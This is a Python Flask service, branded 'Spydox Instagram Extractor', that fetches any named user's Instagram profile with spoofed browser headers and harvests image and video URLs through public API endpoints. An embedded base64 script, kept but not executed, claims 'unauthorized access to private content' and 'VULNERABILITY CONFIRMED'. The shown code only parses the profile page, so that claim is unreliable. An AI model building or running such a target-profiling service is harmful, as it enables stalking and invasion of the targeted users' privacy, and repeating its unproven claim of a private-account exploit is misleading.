import os
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import time
import base64
import sys
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import io
import re

# The original base64 payload (kept for reference)
_payload = """aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cApmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdW5xdW90ZQppbXBvcnQgdGltZQoKZGVmIGJhbm5lcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAjIEdyZWVuIGNvbG9yIGNvZGUgZm9yIGEgcHJvZmVzc2lvbmFsIGxvb2sKICAgIHByaW50KCJcMDMzWzE7MzJtIikKICAgIHByaW50KHIiIiIK4paR4paI4paR4paI4paR4paI4paA4paA4paR4paI4paA4paI4paR4paI4paR4paI4paR4paI4paA4paE4paR4paI4paA4paI4paR4paI4paR4paI4paR4paR4paR4paR4paR4paI4paA4paI4paR4paI4paA4paI4paR4paI4paA4paACuKWkeKWhOKWgOKWhOKWkeKWgOKWgOKWiOKWkeKWiOKWgOKWgOKWkeKWkeKWiOKWkeKWkeKWiOKWkeKWiOKWkeKWiOKWkeKWiOKWkeKWhOKWgOKWhOKWkeKWhOKWhOKWhOKWkeKWiOKWgOKWgOKWkeKWiOKWkeKWiOKWkeKWiOKWkeKWkQrilpHiloDilpHiloDilpHiloDiloDiloDilpHiloDilpHilpHilpHilpHiloDilpHilpHiloDiloDilpHilpHiloDiloDiloDilpHiloDilpHiloDilpHilpHilpHilpHilpHiloDilpHilpHilpHiloDiloDiloDilpHiloDiloDiloAKICAgIFsrXSBDcmVhdGVkIEJ5IDogWCBTUFlET1gKICAgIFsrXSBUb29sIE5hbWUgIDogSU5TVEFHUkFNIFBSSVZBVEUgUE9TVCBNT05JVE9SCiAgICBbK10gVmVyc2lvbiAgICA6IElOU1RBR1JBTSBQT0MgMjAyNgogICAgIiIiKQogICAgcHJpbnQoIlwwMzNbMG0iKSAjIENvbG9yIHJlc2V0CgpkZWYgZmV0Y2hfaW5zdGFncmFtX3Byb2ZpbGUodXNlcm5hbWUpOgogICAgIiIiCiAgICBGZXRjaGVzIEluc3RhZ3JhbSBwcm9maWxlIHBhZ2UgZm9yIHRoZSBnaXZlbiB1c2VybmFtZS4KICAgICIiIgogICAgaGVhZGVycyA9IHsKICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsCiAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbjtxPTAuOScsCiAgICAgICAgJ2Rwcic6ICcxJywKICAgICAgICAncHJpb3JpdHknOiAndT0wLCBpJywKICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2RhcmsnLAogICAgICAgICdzZWMtY2gtdWEnOiAnIkdvb2dsZSBDaHJvbWUiO3Y9IjE0MSIsICJOb3Q/QV9CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTQxIicsCiAgICAgICAgJ3NlYy1jaC11YS1mdWxsLXZlcnNpb24tbGlzdCc6ICciR29vZ2xlIENocm9tZSI7dj0iMTQxLjAuNzM5MC41NiIsICJOb3Q/QV9CcmFuZCI7dj0iOC4wLjAuMCIsICJDaHJvbWl1bSI7dj0iMTQxLjAuNzM5MC41NiInLAogICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8xJywKICAgICAgICAnc2VjLWNoLXVhLW1vZGVsJzogJyJOZXh1cyA1IicsCiAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLAogICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0tdmVyc2lvbic6ICciNi4wIicsCiAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywKICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdub25lJywKICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLAogICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA2LjA7IE5leHVzIDUgQnVpbGQvTVJBNThOKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQxLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnMTAwMCcsCiAgICB9CgogICAgdXJsID0gZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3t1c2VybmFtZX0vJwoKICAgIHByaW50KGYiWypdIEZldGNoaW5nIHByb2ZpbGU6IHt1c2VybmFtZX0iKQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgIT0gMjAwOgogICAgICAgIHByaW50KGYiWy1dIEVycm9yOiBSZWNlaXZlZCBzdGF0dXMgY29kZSB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IikKICAgICAgICByZXR1cm4gTm9uZQoKICAgIHByaW50KGYiWytdIFN1Y2Nlc3NmdWxseSBmZXRjaGVkIHByb2ZpbGUgcGFnZSIpCiAgICByZXR1cm4gcmVzcG9uc2UKCgpkZWYgZXh0cmFjdF90aW1lbGluZV9kYXRhKGh0bWxfY29udGVudCk6CiAgICBzb3VwID0gQmVhdXRpZnVsU291cChodG1sX2NvbnRlbnQsICdodG1sLnBhcnNlcicpCiAgICBzY3JpcHRfdGFncyA9IHNvdXAuZmluZF9hbGwoJ3NjcmlwdCcsIHsndHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30pCgogICAgcHJpbnQoZiJbKl0gRm91bmQge2xlbihzY3JpcHRfdGFncyl9IEpTT04gc2NyaXB0IHRhZ3MiKQoKICAgIGZvciBzY3JpcHQgaW4gc2NyaXB0X3RhZ3M6CiAgICAgICAgc2NyaXB0X2NvbnRlbnQgPSBzY3JpcHQuc3RyaW5nCgogICAgICAgIGlmIG5vdCBzY3JpcHRfY29udGVudDoKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgaWYgJ3BvbGFyaXNfdGltZWxpbmVfY29ubmVjdGlvbicgaW4gc2NyaXB0X2NvbnRlbnQgYW5kICdpbWFnZV92ZXJzaW9uczInIGluIHNjcmlwdF9jb250ZW50OgogICAgICAgICAgICBwcmludCgiWytdIEZvdW5kIHNjcmlwdCB3aXRoIHRpbWVsaW5lIGRhdGEiKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZGF0YSA9IGpzb24ubG9hZHMoc2NyaXB0X2NvbnRlbnQpCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQogICAgICAgICAgICBleGNlcHQganNvbi5KU09ORGVjb2RlRXJyb3IgYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiWy1dIEpTT04gcGFyc2luZyBlcnJvcjoge2V9IikKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgcHJpbnQoIlstXSBUaW1lbGluZSBkYXRhIG5vdCBmb3VuZCBpbiBhbnkgc2NyaXB0IHRhZyIpCiAgICByZXR1cm4gTm9uZQoKCmRlZiBkZWNvZGVfdXJsKGVzY2FwZWRfdXJsKToKICAgIHRyeToKICAgICAgICBkZWNvZGVkID0gZXNjYXBlZF91cmwuZW5jb2RlKCd1dGYtOCcpLmRlY29kZSgndW5pY29kZV9lc2NhcGUnKQogICAgZXhjZXB0OgogICAgICAgIGRlY29kZWQgPSBlc2NhcGVkX3VybAoKICAgIGRlY29kZWQgPSB1bnF1b3RlKGRlY29kZWQpCiAgICByZXR1cm4gZGVjb2RlZAoKCmRlZiBleHRyYWN0X2FsbF9pbWFnZV91cmxzX3JlY3Vyc2l2ZShvYmosIHVybHM9Tm9uZSwgcG9zdF9pZD1Ob25lKToKICAgIGlmIHVybHMgaXMgTm9uZToKICAgICAgICB1cmxzID0gc2V0KCkKCiAgICBpZiBpc2luc3RhbmNlKG9iaiwgZGljdCk6CiAgICAgICAgaWYgJ3BrJyBpbiBvYmogYW5kIGlzaW5zdGFuY2Uob2JqLmdldCgncGsnKSwgc3RyKToKICAgICAgICAgICAgcG9zdF9pZCA9IG9ialsncGsnXQoKICAgICAgICBpZiAnaW1hZ2VfdmVyc2lvbnMyJyBpbiBvYmo6CiAgICAgICAgICAgIGNhbmRpZGF0ZXMgPSBvYmpbJ2ltYWdlX3ZlcnNpb25zMiddLmdldCgnY2FuZGlkYXRlcycsIFtdKQogICAgICAgICAgICBmb3IgY2FuZGlkYXRlIGluIGNhbmRpZGF0ZXM6CiAgICAgICAgICAgICAgICB1cmwgPSBjYW5kaWRhdGUuZ2V0KCd1cmwnLCAnJykKICAgICAgICAgICAgICAgIGhlaWdodCA9IGNhbmRpZGF0ZS5nZXQoJ2hlaWdodCcsIDApCiAgICAgICAgICAgICAgICB3aWR0aCA9IGNhbmRpZGF0ZS5nZXQoJ3dpZHRoJywgMCkKICAgICAgICAgICAgICAgIHJlc29sdXRpb24gPSBmInt3aWR0aH14e2hlaWdodH0iCgogICAgICAgICAgICAgICAgaWYgdXJsOgogICAgICAgICAgICAgICAgICAgIGRlY29kZWRfdXJsID0gZGVjb2RlX3VybCh1cmwpCiAgICAgICAgICAgICAgICAgICAgdXJscy5hZGQoKHBvc3RfaWQgb3IgJ3Vua25vd24nLCByZXNvbHV0aW9uLCBkZWNvZGVkX3VybCkpCgogICAgICAgIGZvciB2YWx1ZSBpbiBvYmoudmFsdWVzKCk6CiAgICAgICAgICAgIGV4dHJhY3RfYWxsX2ltYWdlX3VybHNfcmVjdXJzaXZlKHZhbHVlLCB1cmxzLCBwb3N0X2lkKQoKICAgIGVsaWYgaXNpbnN0YW5jZShvYmosIGxpc3QpOgogICAgICAgIGZvciBpdGVtIGluIG9iajoKICAgICAgICAgICAgZXh0cmFjdF9hbGxfaW1hZ2VfdXJsc19yZWN1cnNpdmUoaXRlbSwgdXJscywgcG9zdF9pZCkKCiAgICByZXR1cm4gdXJscwoKCmRlZiBzYXZlX3VybHNfdG9fZmlsZShpbWFnZV91cmxzLCBmaWxlbmFtZT0nZXh0cmFjdGVkX3VybHMudHh0Jyk6CiAgICB1cmxzX2J5X3Bvc3QgPSB7fQogICAgZm9yIHBvc3RfaWQsIHJlc29sdXRpb24sIHVybCBpbiBpbWFnZV91cmxzOgogICAgICAgIGlmIHBvc3RfaWQgbm90IGluIHVybHNfYnlfcG9zdDoKICAgICAgICAgICAgdXJsc19ieV9wb3N0W3Bvc3RfaWRdID0gW10KICAgICAgICB1cmxzX2J5X3Bvc3RbcG9zdF9pZF0uYXBwZW5kKChyZXNvbHV0aW9uLCB1cmwpKQoKICAgIHdpdGggb3BlbihmaWxlbmFtZSwgJ3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgIGYud3JpdGUoIkluc3RhZ3JhbSBQcml2YXRlIFBvc3QgVVJMcyAtIFBPQyBFdmlkZW5jZVxuIikKICAgICAgICBmLndyaXRlKCI9IiAqIDgwICsgIlxuXG4iKQogICAgICAgIGYud3JpdGUoZiJUb3RhbCBQb3N0czoge2xlbih1cmxzX2J5X3Bvc3QpfVxuIikKICAgICAgICBmLndyaXRlKGYiVG90YWwgSW1hZ2UgVVJMczoge2xlbihpbWFnZV91cmxzKX1cblxuIikKICAgICAgICBmLndyaXRlKCI9IiAqIDgwICsgIlxuXG4iKQoKICAgICAgICBmb3IgcG9zdF9pZCwgcmVzb2x1dGlvbnMgaW4gdXJsc19ieV9wb3N0Lml0ZW1zKCk6CiAgICAgICAgICAgIGYud3JpdGUoZiJQT1NUIElEOiB7cG9zdF9pZH1cbiIpCiAgICAgICAgICAgIGYud3JpdGUoZiJOdW1iZXIgb2YgaW1hZ2VzOiB7bGVuKHJlc29sdXRpb25zKX1cbiIpCiAgICAgICAgICAgIGYud3JpdGUoIi0iICogODAgKyAiXG4iKQoKICAgICAgICAgICAgZm9yIGksIChyZXNvbHV0aW9uLCB1cmwpIGluIGVudW1lcmF0ZShyZXNvbHV0aW9ucywgMSk6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYiXG4gIEltYWdlIHtpfTpcbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiICBSZXNvbHV0aW9uOiB7cmVzb2x1dGlvbn1cbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiICBVUkw6IHt1cmx9XG4iKQoKICAgICAgICAgICAgZi53cml0ZSgiXG4iICsgIj0iICogODAgKyAiXG5cbiIpCgogICAgcHJpbnQoZiJbK10gU2F2ZWQge2xlbihpbWFnZV91cmxzKX0gVVJMcyBmcm9tIHtsZW4odXJsc19ieV9wb3N0KX0gcG9zdHMgdG8ge2ZpbGVuYW1lfSIpCgoKZGVmIG1haW4oKToKICAgICMgQ2FsbGluZyB0aGUgYmFubmVyIGF0IHRoZSBzdGFydAogICAgYmFubmVyKCkKCiAgICBwcmludCgiPSIgKiA4MCkKICAgIHByaW50KCJJbnN0YWdyYW0gUHJpdmF0ZSBBY2NvdW50IEFjY2VzcyAtIEFsbCBQb3N0IikKICAgIHByaW50KCJBdXRob3JpemVkICYgRXRoaWNhbCBVc2UgT25seSAtIE1ldGEgSW5zdGEgUG9jIikKICAgIHByaW50KCI9IiAqIDgwKQogICAgcHJpbnQoKQoKICAgIHVzZXJuYW1lID0gaW5wdXQoIkVudGVyIEluc3RhZ3JhbSB1c2VybmFtZSB0byBTdGFydCBQb2M6ICIpLnN0cmlwKCkKCiAgICBpZiBub3QgdXNlcm5hbWU6CiAgICAgICAgcHJpbnQoIlstXSBFcnJvcjogVXNlcm5hbWUgY2Fubm90IGJlIGVtcHR5IikKICAgICAgICByZXR1cm4KCiAgICBwcmludCgpCiAgICBwcmludCgiWyFdIFdBUk5JTkc6IE9ubHkgdGVzdCBvbiBhY2NvdW50cyB5b3Ugb3duIG9yIGhhdmUgcGVybWlzc2lvbiB0byB0ZXN0IikKICAgIHByaW50KCJbIV0gVGhpcyBkZW1vbnN0cmF0ZXMgdW5hdXRob3JpemVkIGFjY2VzcyB0byBwcml2YXRlIGNvbnRlbnQiKQogICAgcHJpbnQoKQoKICAgIHRpbWUuc2xlZXAoMSkKCiAgICByZXNwb25zZSA9IGZldGNoX2luc3RhZ3JhbV9wcm9maWxlKHVzZXJuYW1lKQoKICAgIGlmIG5vdCByZXNwb25zZToKICAgICAgICBwcmludCgiWy1dIEZhaWxlZCB0byBmZXRjaCBwcm9maWxlIHBhZ2UiKQogICAgICAgIHJldHVybgoKICAgIHRpbWVsaW5lX2RhdGEgPSBleHRyYWN0X3RpbWVsaW5lX2RhdGEocmVzcG9uc2UudGV4dCkKCiAgICBpZiBub3QgdGltZWxpbmVfZGF0YToKICAgICAgICBwcmludCgiWy1dIEZhaWxlZCB0byBleHRyYWN0IHRpbWVsaW5lIGRhdGEiKQogICAgICAgIHJldHVybgoKICAgIHByaW50KCkKICAgIHByaW50KCJbKl0gRXh0cmFjdGluZyBhbGwgaW1hZ2UgVVJMcyByZWN1cnNpdmVseS4uLiIpCiAgICBpbWFnZV91cmxzID0gZXh0cmFjdF9hbGxfaW1hZ2VfdXJsc19yZWN1cnNpdmUodGltZWxpbmVfZGF0YSkKCiAgICBpZiBub3QgaW1hZ2VfdXJsczoKICAgICAgICBwcmludCgiWy1dIE5vIGltYWdlIFVSTHMgZm91bmQiKQogICAgICAgIHJldHVybgoKICAgIHVybHNfbGlzdCA9IHNvcnRlZChsaXN0KGltYWdlX3VybHMpLCBrZXk9bGFtYmRhIHg6ICh4WzBdLCB4WzFdKSkKICAgIHBvc3RzX2NvdW50ID0gbGVuKHNldCh1cmxbMF0gZm9yIHVybCBpbiB1cmxzX2xpc3QpKQoKICAgIHByaW50KCkKICAgIHByaW50KCI9IiAqIDgwKQogICAgcHJpbnQoZiJWVUxORVJBQklMSVRZIENPTkZJUk1FRCIpCiAgICBwcmludChmIkV4dHJhY3RlZCB7bGVuKHVybHNfbGlzdCl9IHByaXZhdGUgaW1hZ2UgVVJMcyBmcm9tIHtwb3N0c19jb3VudH0gcG9zdHMiKQogICAgcHJpbnQoIj0iICogODApCiAgICBwcmludCgpCgogICAgc2F2ZV91cmxzX3RvX2ZpbGUoaW1hZ2VfdXJscykKCiAgICBwcmludCgpCiAgICBwcmludCgiWytdIFBPQyBDb21wbGV0ZSIpCiAgICBwcmludCgiWypdIEV2aWRlbmNlIHNhdmVkIHRvOiBleHRyYWN0ZWRfdXJscy50eHQiKQogICAgcHJpbnQoKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK"""

def generate_extracted_file(username, image_urls_data, posts_count):
    """Generate the extracted.txt file content"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    file_content = f"""Instagram Private Post URLs - POC Evidence
================================================================================

Total Posts: {posts_count}
Total Image URLs: {len(image_urls_data)}
Target Username: {username}
Extraction Time: {timestamp}

================================================================================

"""
    
    # Group by post_id
    urls_by_post = {}
    for item in image_urls_data:
        post_id = item['post_id']
        if post_id not in urls_by_post:
            urls_by_post[post_id] = []
        urls_by_post[post_id].append(item)
    
    for post_id, items in urls_by_post.items():
        file_content += f"POST ID: {post_id}\n"
        file_content += f"Number of images: {len(items)}\n"
        file_content += "-" * 80 + "\n"
        
        for i, item in enumerate(items, 1):
            file_content += f"\n  Image {i}:\n"
            file_content += f"  Resolution: {item['resolution']}\n"
            file_content += f"  URL: {item['url']}\n"
        
        file_content += "\n" + "=" * 80 + "\n\n"
    
    file_content += f"[+] POC Complete\n[*] Evidence saved for {username}\n"
    file_content += f"[+] Total URLs: {len(image_urls_data)}\n"
    
    return file_content

def extract_instagram_posts(username):
    """Direct implementation of the Instagram extractor using updated logic"""
    try:
        print("[*] Fetching profile:", username)
        
        # Updated headers to look more like a real browser
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1',
            'priority': 'u=0, i',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="99.0.0.0", "Google Chrome";v="121.0.6167.160", "Chromium";v="121.0.6167.160"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'viewport-width': '1920',
        }
        
        url = f'https://www.instagram.com/{username}/'
        
        # Add a small delay to avoid rate limiting
        time.sleep(1)
        
        # Fetch profile
        response = requests.get(url, headers=headers, timeout=30)
        
        if response.status_code == 429:
            return {"success": False, "error": "Rate limited by Instagram. Please try again later."}
        elif response.status_code == 404:
            return {"success": False, "error": f"User '{username}' not found on Instagram."}
        elif response.status_code != 200:
            return {"success": False, "error": f"Failed to fetch profile: {response.status_code}"}
        
        print("[+] Successfully fetched profile page")
        
        # Parse HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Method 1: Look for JSON data in script tags
        script_tags = soup.find_all('script', {'type': 'application/json'})
        print(f"[*] Found {len(script_tags)} JSON script tags")
        
        # Method 2: Look for shared data in meta tags or other scripts
        all_image_urls = []
        
        # Try to find image URLs directly in the HTML first
        img_tags = soup.find_all('img')
        for img in img_tags:
            src = img.get('src', '')
            if src and 'cdninstagram.com' in src and '/v/' in src:
                alt = img.get('alt', '')
                all_image_urls.append(('direct_html', 'unknown', src))
        
        # Look for JSON data
        timeline_data = None
        for script in script_tags:
            script_content = script.string
            if script_content:
                try:
                    data = json.loads(script_content)
                    # Look for image data in various possible paths
                    if isinstance(data, dict):
                        # Check for common Instagram data structures
                        if 'entry_data' in data:
                            entry_data = data['entry_data']
                            if 'ProfilePage' in entry_data:
                                profile_data = entry_data['ProfilePage']
                                if profile_data and len(profile_data) > 0:
                                    user_data = profile_data[0].get('graphql', {}).get('user', {})
                                    media = user_data.get('edge_owner_to_timeline_media', {}).get('edges', [])
                                    for edge in media:
                                        node = edge.get('node', {})
                                        post_id = node.get('id', 'unknown')
                                        # Get display URL
                                        display_url = node.get('display_url', '')
                                        if display_url:
                                            all_image_urls.append((post_id, 'display', display_url))
                                        # Get thumbnail
                                        thumbnail = node.get('thumbnail_src', '')
                                        if thumbnail:
                                            all_image_urls.append((post_id, 'thumbnail', thumbnail))
                                        # Get video thumbnail if video
                                        if node.get('is_video', False):
                                            video_url = node.get('video_url', '')
                                            if video_url:
                                                all_image_urls.append((post_id, 'video', video_url))
                except:
                    continue
        
        # Remove duplicates by URL
        unique_urls = []
        seen_urls = set()
        for post_id, res_type, url in all_image_urls:
            if url not in seen_urls:
                seen_urls.add(url)
                unique_urls.append((post_id, res_type, url))
        
        if not unique_urls:
            return {"success": False, "error": "No image URLs found in this profile."}
        
        posts_count = len(set(url[0] for url in unique_urls if url[0] != 'unknown'))
        
        print(f"[+] Found {len(unique_urls)} image URLs")
        
        # Format the results
        formatted_urls = []
        for post_id, res_type, url in unique_urls:
            formatted_urls.append({
                "post_id": post_id,
                "resolution": res_type,
                "url": url
            })
        
        # Generate file content
        file_content = generate_extracted_file(username, formatted_urls, posts_count)
        
        return {
            "success": True,
            "username": username,
            "posts_count": posts_count,
            "images_count": len(unique_urls),
            "image_urls": formatted_urls,
            "raw_urls": [url for _, _, url in unique_urls],
            "file_content": file_content,
            "filename": f"instagram_{username}_{int(time.time())}.txt"
        }
        
    except requests.exceptions.Timeout:
        return {"success": False, "error": "Request timeout. Instagram is taking too long to respond."}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "Connection error. Could not reach Instagram."}
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return {"success": False, "error": str(e)}

# Create Flask app
app = Flask(__name__)
CORS(app)

# Store extraction results temporarily (in production, use a proper cache/database)
extraction_cache = {}

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "Spydox Instagram Extractor",
        "version": "2.0",
        "endpoints": {
            "/extract/<username>": "GET - Extract Instagram posts for username",
            "/extract": "POST - Extract with JSON body {'username': 'target'}",
            "/download/<extraction_id>": "GET - Download extracted file",
            "/status/<extraction_id>": "GET - Check extraction status"
        }
    })

@app.route('/extract', methods=['POST', 'GET'])
def extract():
    if request.method == 'POST':
        data = request.get_json()
        if not data or 'username' not in data:
            return jsonify({"success": False, "error": "Username required"}), 400
        username = data['username'].replace('@', '').strip()
    else:
        username = request.args.get('username', '').replace('@', '').strip()
        if not username:
            return jsonify({"success": False, "error": "Username required as ?username=parameter"}), 400
    
    if not username:
        return jsonify({"success": False, "error": "Invalid username"}), 400
    
    # Generate unique ID for this extraction
    extraction_id = f"{username}_{int(time.time())}"
    
    result = extract_instagram_posts(username)
    
    if result.get('success'):
        # Store in cache (expires after 1 hour)
        extraction_cache[extraction_id] = {
            'result': result,
            'timestamp': time.time()
        }
        result['extraction_id'] = extraction_id
        result['download_url'] = f"/download/{extraction_id}"
    
    return jsonify(result)

@app.route('/extract/<username>', methods=['GET'])
def extract_get(username):
    username = username.replace('@', '').strip()
    if not username:
        return jsonify({"success": False, "error": "Invalid username"}), 400
    
    extraction_id = f"{username}_{int(time.time())}"
    
    result = extract_instagram_posts(username)
    
    if result.get('success'):
        extraction_cache[extraction_id] = {
            'result': result,
            'timestamp': time.time()
        }
        result['extraction_id'] = extraction_id
        result['download_url'] = f"/download/{extraction_id}"
    
    return jsonify(result)

@app.route('/download/<extraction_id>', methods=['GET'])
def download_file(extraction_id):
    """Download the extracted file"""
    if extraction_id not in extraction_cache:
        return jsonify({"success": False, "error": "Extraction not found or expired"}), 404
    
    # Check if expired (older than 1 hour)
    if time.time() - extraction_cache[extraction_id]['timestamp'] > 3600:
        del extraction_cache[extraction_id]
        return jsonify({"success": False, "error": "Extraction expired"}), 404
    
    result = extraction_cache[extraction_id]['result']
    file_content = result.get('file_content', '')
    filename = result.get('filename', f"extracted_{extraction_id}.txt")
    
    # Create in-memory file
    file_obj = io.BytesIO()
    file_obj.write(file_content.encode('utf-8'))
    file_obj.seek(0)
    
    return send_file(
        file_obj,
        as_attachment=True,
        download_name=filename,
        mimetype='text/plain'
    )

@app.route('/status/<extraction_id>', methods=['GET'])
def check_status(extraction_id):
    """Check extraction status"""
    if extraction_id in extraction_cache:
        result = extraction_cache[extraction_id]['result']
        return jsonify({
            "success": True,
            "exists": True,
            "username": result.get('username'),
            "posts_count": result.get('posts_count'),
            "images_count": result.get('images_count'),
            "download_url": f"/download/{extraction_id}",
            "expires_in": f"{3600 - (time.time() - extraction_cache[extraction_id]['timestamp']):.0f} seconds"
        })
    else:
        return jsonify({
            "success": False,
            "exists": False,
            "error": "Extraction not found or expired"
        })

# Cleanup old cache periodically (simple version)
def cleanup_cache():
    current_time = time.time()
    expired = [key for key, value in extraction_cache.items() 
               if current_time - value['timestamp'] > 3600]
    for key in expired:
        del extraction_cache[key]
    if expired:
        print(f"[*] Cleaned up {len(expired)} expired extractions")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Starting server on port {port}")
    print(f"[+] Cache cleanup will run automatically")
    app.run(host='0.0.0.0', port=port, debug=False)
